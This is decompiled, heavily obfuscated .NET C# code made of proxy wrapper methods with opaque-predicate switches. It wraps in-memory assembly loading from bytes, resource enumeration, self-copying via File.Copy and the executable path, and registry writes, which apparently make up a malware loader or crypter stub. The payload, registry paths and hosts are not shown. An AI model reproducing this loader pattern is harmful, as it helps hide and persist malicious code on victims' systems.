using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class5
{
	internal sealed class Class6
	{
		internal sealed class Class7
		{
			[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 334)]
			private struct Struct3
			{
			}

			private static readonly Array array_0;

			private static readonly object object_0;

			private static readonly Array array_1;

			internal static byte byte_0/* Not supported: data(00) */;

			internal static int smethod_0(short short_0, short short_1)
			{
				int num = 0;
				int result;
				int num2;
				do
				{
					result = (((short_0 ^ short_1) - 5) ^ num) switch
					{
						0 => Environment.TickCount, 
						_ => 2, 
					};
					num++;
					num2 = short_1 * short_1;
					num2 = short_1 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			internal static bool smethod_1<T>(T gparam_0, int int_0, int int_1) where T : string
			{
				int num = 0;
				bool result = (((int_1 ^ int_0) - 91) ^ 0) switch
				{
					0 => File.Exists(gparam_0), 
					_ => false, 
				};
				num++;
				return result;
			}

			internal static void smethod_2<T, U, V>(T gparam_0, U gparam_1, V gparam_2, char char_0, short short_0) where T : AppDomain where U : string
			{
				int num = 0;
				do
				{
					switch (((char_0 ^ short_0) - 59) ^ num)
					{
					case 0:
						gparam_0.SetData(gparam_1, gparam_2);
						break;
					}
					num++;
				}
				while ((short_0 * short_0 + short_0) % 2 != 0);
			}

			internal static int smethod_3<T>(T gparam_0, byte[] byte_1, int int_0, int int_1, short short_0, char char_0) where T : Stream
			{
				int num = 0;
				int result = (((short_0 ^ char_0) - 48) ^ 0) switch
				{
					0 => Class9.Class10.smethod_1((Stream)gparam_0, byte_1, int_0, int_1, (short)834, (short)829), 
					_ => int_0, 
				};
				num++;
				return result;
			}

			internal static void smethod_4<T, U>(U gparam_0, T gparam_1, short short_0, int int_0) where T : string where U : string
			{
				int num = 0;
				do
				{
					switch (((int_0 ^ short_0) - 15) ^ num)
					{
					case 0:
						File.Copy(gparam_0, gparam_1);
						break;
					}
					num++;
				}
				while ((short_0 * short_0 + short_0) % 2 != 0);
			}

			internal static void smethod_5<T, U, V>(V gparam_0, U gparam_1, T gparam_2, short short_0, int int_0) where U : string where V : RegistryKey
			{
				int num = 0;
				do
				{
					switch (((short_0 ^ int_0) - 4) ^ num)
					{
					case 0:
						Class9.smethod_0((RegistryKey)gparam_0, (string)gparam_1, (object)gparam_2, 693, (short)728);
						break;
					}
					num++;
				}
				while ((short_0 * short_0 + short_0) % 2 != 0);
			}

			static Class7()
			{
				object_0 = new char[167];
				char[] array = new char[8];
				array[1] = '෩';
				array[4] = 'Ɐ';
				array[6] = '㤄';
				array[0] = '㺧';
				array[3] = 'গ';
				array[2] = '\u1dcf';
				array[5] = '㍠';
				array[7] = '⾻';
				array_1 = new string[7];
				array_0 = array;
			}
		}

		internal sealed class Class8
		{
			internal static int smethod_0<T>(T gparam_0, int int_0, int int_1, int int_2, char char_0) where T : Random
			{
				int num = 0;
				int result = (((char_0 ^ int_2) - 21) ^ 0) switch
				{
					0 => gparam_0.Next(int_0, int_1), 
					_ => int_0, 
				};
				num++;
				return result;
			}

			internal static string smethod_1<T, U>(T gparam_0, U gparam_1, char char_0, short short_0) where T : string where U : string
			{
				int num = 0;
				string result = (((char_0 ^ short_0) - 12) ^ 0) switch
				{
					0 => (string)(IEquatable<string>)Class9.smethod_1((string)gparam_0, (string)gparam_1, 921, 'Ϸ'), 
					1 => (string)(IEquatable<string>)Class9.smethod_1((string)gparam_0, (string)gparam_1, 934, 'ψ'), 
					_ => null, 
				};
				num++;
				return result;
			}

			internal static string smethod_2(Environment.SpecialFolder specialFolder_0, char char_0, char char_1)
			{
				int num = 0;
				string result;
				int num2;
				do
				{
					result = (((char_1 ^ char_0) - 73) ^ num) switch
					{
						0 => (string)(ICloneable)Environment.GetFolderPath(specialFolder_0), 
						_ => null, 
					};
					num++;
					num2 = char_0 * char_0;
					num2 = char_0 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			internal static AppDomain smethod_3(char char_0, int int_0)
			{
				//IL_0009: Unknown result type (might be due to invalid IL or missing references)
				//IL_000f: Expected O, but got Unknown
				int num = 0;
				AppDomain result;
				int num2;
				do
				{
					result = (((char_0 ^ int_0) - 8) ^ num) switch
					{
						0 => (AppDomain)(_AppDomain)AppDomain.CurrentDomain, 
						_ => null, 
					};
					num++;
					num2 = char_0 * char_0;
					num2 = char_0 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			internal static string[] smethod_4<T>(T gparam_0, short short_0, short short_1) where T : Assembly
			{
				int num = 0;
				string[] result = (((short_1 ^ short_0) - 121) ^ 0) switch
				{
					0 => Class9.smethod_2((Assembly)gparam_0, '\u02f3', 673), 
					_ => null, 
				};
				num++;
				return result;
			}

			internal static string smethod_5(char char_0, char char_1)
			{
				int num = 0;
				string result;
				do
				{
					result = (((char_0 ^ char_1) - 75) ^ num) switch
					{
						0 => Application.get_ExecutablePath(), 
						_ => null, 
					};
					num++;
				}
				while ((char_0 * char_0 + char_0) % 2 != 0);
				return result;
			}
		}

		internal static object smethod_0<T, U>(T gparam_0, U gparam_1, short short_0, char char_0) where T : AppDomain where U : string
		{
			int num = 0;
			object result;
			do
			{
				result = (((short_0 ^ char_0) - 62) ^ num) switch
				{
					0 => gparam_0.GetData(gparam_1), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static Assembly smethod_1<T>(byte[] byte_0, byte[] byte_1, T gparam_0, char char_0, short short_0) where T : Evidence
		{
			int num = 0;
			Assembly result = (((char_0 ^ short_0) - 75) ^ 0) switch
			{
				0 => (Assembly)(ICustomAttributeProvider)Assembly.Load(byte_0, byte_1, (Evidence)gparam_0), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static RegistryKey smethod_2<T, U>(U gparam_0, T gparam_1, bool bool_0, int int_0, char char_0) where T : string where U : RegistryKey
		{
			int num = 0;
			RegistryKey result = (((int_0 ^ char_0) - 24) ^ 0) switch
			{
				0 => (RegistryKey)(IDisposable)Class9.smethod_3((RegistryKey)gparam_0, (string)gparam_1, bool_0, 'ê', 160), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_3<T>(T gparam_0, char char_0, int int_0) where T : RegistryKey
		{
			int num = 0;
			switch (((char_0 ^ int_0) - 109) ^ 0)
			{
			case 0:
				Class9.Class10.smethod_2((RegistryKey)gparam_0, (short)692, 651);
				break;
			}
			num++;
		}

		internal static int smethod_4<T>(T gparam_0, int int_0, char char_0, int int_1) where T : Array
		{
			int num = 0;
			int result = (((char_0 ^ int_1) - 7) ^ 0) switch
			{
				0 => Class9.Class10.smethod_3((Array)gparam_0, int_0, 'á', 137), 
				_ => int_1, 
			};
			num++;
			return result;
		}
	}

	internal sealed class Class9
	{
		internal sealed class Class10
		{
			internal static StringBuilder smethod_0<T>(T gparam_0, char char_0, int int_0, char char_1) where T : StringBuilder
			{
				int num = 0;
				StringBuilder result;
				do
				{
					result = (((int_0 ^ char_1) - 2) ^ num) switch
					{
						0 => gparam_0.Append(char_0), 
						_ => null, 
					};
					num++;
				}
				while ((char_0 * char_0 + char_0) % 2 != 0);
				return result;
			}

			internal static int smethod_1<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, short short_0, short short_1) where T : Stream
			{
				int num = 0;
				int result;
				int num2;
				do
				{
					result = (((short_0 ^ short_1) - 127) ^ num) switch
					{
						0 => gparam_0.Read(byte_0, int_0, int_1), 
						_ => int_1, 
					};
					num++;
					num2 = short_0 * short_0;
					num2 = short_0 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}

			internal static void smethod_2<T>(T gparam_0, short short_0, int int_0) where T : RegistryKey
			{
				int num = 0;
				switch (((int_0 ^ short_0) - 63) ^ 0)
				{
				case 0:
					gparam_0.Close();
					break;
				}
				num++;
			}

			internal static int smethod_3<T>(T gparam_0, int int_0, char char_0, int int_1) where T : Array
			{
				int num = 0;
				int result = (((int_1 ^ char_0) - 104) ^ 0) switch
				{
					0 => gparam_0.GetLength(int_0), 
					_ => 5, 
				};
				num++;
				return result;
			}

			internal static string smethod_4<T>(T gparam_0, short short_0, char char_0) where T : ResolveEventArgs
			{
				int num = 0;
				string result = (((short_0 ^ char_0) - 12) ^ 0) switch
				{
					0 => (string)(IComparable)gparam_0.Name, 
					_ => null, 
				};
				num++;
				return result;
			}

			internal static void smethod_5<T>(T gparam_0, int int_0, int int_1)
			{
				int num = 0;
				switch (((int_0 ^ int_1) - 25) ^ 0)
				{
				case 0:
					Monitor.Enter(gparam_0);
					break;
				case 1:
					Monitor.Exit(gparam_0);
					break;
				}
				num++;
			}

			internal static char[] smethod_6<T>(T gparam_0, char char_0, short short_0) where T : string
			{
				int num = 0;
				char[] result;
				int num2;
				do
				{
					result = (((short_0 ^ char_0) - 79) ^ num) switch
					{
						0 => (char[])(Array)gparam_0.ToCharArray(), 
						_ => null, 
					};
					num++;
					num2 = char_0 * char_0;
					num2 = char_0 + num2;
				}
				while (num2 % 2 != 0);
				return result;
			}
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 78)]
		private struct Struct4
		{
		}

		private static readonly object object_0;

		private static readonly Array array_0;

		private static readonly object object_1;

		internal static byte byte_0/* Not supported: data(00) */;

		internal static void smethod_0<T, U, V>(T gparam_0, V gparam_1, U gparam_2, int int_0, short short_0) where T : RegistryKey where V : string
		{
			int num = 0;
			switch (((int_0 ^ short_0) - 109) ^ 0)
			{
			case 0:
				gparam_0.SetValue(gparam_1, gparam_2);
				break;
			}
			num++;
		}

		internal static string smethod_1<T, U>(U gparam_0, T gparam_1, int int_0, char char_0) where T : string where U : string
		{
			int num = 0;
			string result = (((char_0 ^ int_0) - 110) ^ 0) switch
			{
				0 => (string)(IConvertible)string.Concat(gparam_0, gparam_1), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static string[] smethod_2<T>(T gparam_0, char char_0, int int_0) where T : Assembly
		{
			int num = 0;
			string[] result = (((int_0 ^ char_0) - 82) ^ 0) switch
			{
				0 => gparam_0.GetManifestResourceNames(), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static RegistryKey smethod_3<T, U>(T gparam_0, U gparam_1, bool bool_0, char char_0, int int_0) where T : RegistryKey where U : string
		{
			int num = 0;
			RegistryKey result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 74) ^ num) switch
				{
					0 => gparam_0.OpenSubKey(gparam_1, bool_0), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static Assembly smethod_4(short short_0, int int_0)
		{
			int num = 0;
			Assembly result = (((short_0 ^ int_0) - 18) ^ 0) switch
			{
				0 => (Assembly)(ICustomAttributeProvider)Assembly.GetExecutingAssembly(), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_5<T, U>(T gparam_0, U gparam_1, int int_0, int int_1) where T : AppDomain where U : ResolveEventHandler
		{
			int num = 0;
			switch (((int_1 ^ int_0) - 11) ^ 0)
			{
			case 0:
				gparam_0.ResourceResolve += gparam_1;
				break;
			}
			num++;
		}

		static Class9()
		{
			array_0 = new char[39];
			char[] array = new char[8];
			array[0] = '╓';
			array[7] = 'Ɑ';
			array[1] = '\u12c1';
			array[3] = 'ࢺ';
			array[6] = '௱';
			array[4] = 'Ⴊ';
			array[5] = '◐';
			array[2] = 'ታ';
			object_1 = new string[1];
			object_0 = array;
		}
	}

	internal static Assembly smethod_0(char char_0, int int_0)
	{
		int num = 0;
		Assembly result = (((int_0 ^ char_0) - 104) ^ 0) switch
		{
			0 => (Assembly)(ISerializable)Class9.smethod_4(288, 306), 
			1 => (Assembly)(ISerializable)Class9.smethod_4(727, 709), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static byte[] smethod_1<T>(T gparam_0, short short_0, int int_0) where T : MemoryStream
	{
		int num = 0;
		byte[] result;
		do
		{
			result = (((int_0 ^ short_0) - 60) ^ num) switch
			{
				0 => (byte[])(Array)gparam_0.ToArray(), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static Evidence smethod_2<T>(T gparam_0, short short_0, int int_0) where T : Assembly
	{
		int num = 0;
		Evidence result;
		int num2;
		do
		{
			result = (((short_0 ^ int_0) - 52) ^ num) switch
			{
				0 => ((Assembly)gparam_0).get_Evidence(), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static Encoding smethod_3(int int_0, int int_1)
	{
		int num = 0;
		Encoding result = (((int_1 ^ int_0) - 67) ^ 0) switch
		{
			0 => Encoding.Default, 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static object smethod_4<T, U>(U gparam_0, T gparam_1, short short_0, short short_1) where T : string where U : ResourceManager
	{
		int num = 0;
		object result;
		do
		{
			result = (((short_1 ^ short_0) - 27) ^ num) switch
			{
				0 => gparam_0.GetObject(gparam_1), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static ParameterInfo[] smethod_5<T>(T gparam_0, char char_0, short short_0) where T : MethodBase
	{
		int num = 0;
		ParameterInfo[] result;
		int num2;
		do
		{
			result = (((char_0 ^ short_0) - 104) ^ num) switch
			{
				0 => gparam_0.GetParameters(), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}
}
